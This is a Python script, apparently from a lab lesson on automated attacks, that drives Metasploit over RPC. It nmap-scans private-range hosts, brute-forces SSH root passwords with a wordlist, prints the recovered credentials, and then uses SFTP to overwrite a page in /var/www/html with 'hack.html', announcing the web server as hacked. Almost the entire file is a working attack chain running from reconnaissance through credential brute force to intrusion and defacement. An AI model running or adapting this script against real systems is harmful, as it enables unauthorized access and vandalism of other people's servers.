from pymetasploit3.msfrpc import MsfRpcClient, MsfConsole, WorkspaceManager
import time
import paramiko

client = MsfRpcClient(server='127.0.0.1', port=55553, password='msf')
print("Finding Hosts ...\n\n")
cid = client.consoles.console().cid

console = client.consoles.console(cid)
console.read()
wsm = WorkspaceManager(client)
wsm.add('lesson_A_auto_attack')
wsm.set('lesson_A_auto_attack')

workspace = wsm.current

console.write(command='db_nmap -Pn -A 10.10.0.40,50,60')

result = ''

while result == '' or console.is_busy():
    time.sleep(1)
    result = result + console.read()['data']
#print(result)
# result = console.read()
print("Find Hosts:")
print([n['address'] for n in workspace.hosts.list])
print("\n Find Service:")
for s in workspace.services.list:
    print("host:%s  service:%s  port:%s" % (s['host'],s['name'],s['port']))


exploit = client.modules.use(mtype='auxiliary', mname='scanner/ssh/ssh_login')
exploit['RHOSTS'] = '10.10.0.60'
exploit['THREADS'] = 5
exploit['USERNAME'] = 'root'
exploit['PASS_FILE'] = '/usr/share/metasploit-framework/data/wordlists/password.lst'
result = console.run_module_with_output(exploit)

print("Find SSH root creds:")
#print(workspace.creds.list)
for c in workspace.creds.list:
    print("host: %s userName: %s  password: %s" % (c['host'],c['user'],c['pass']))

h = workspace.creds.list[0]
try:
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy)
    ssh.connect(h['host'], 22, username=h['user'], password=h['pass'], timeout=5)
    sftp = paramiko.SFTPClient.from_transport(ssh.get_transport())
    sftp = ssh.open_sftp()
    wpg = sftp.listdir('/var/www/html')
    print("Find Web Page in /var/www/html/: %s" % wpg)
    att = sftp.put('/data/py_script/hack.html',wpg[0])
    print(att)
    if att.st_size > 0: 
        print('Web Server %s Hacked!\n' % h['host'])
    else:
        print('Web Server %s Hack Failed!' % h['host'])
    sftp.close()
    ssh.close()
except:
    print('%s Error\n' % (ip))

console.destroy()
workspace.delete()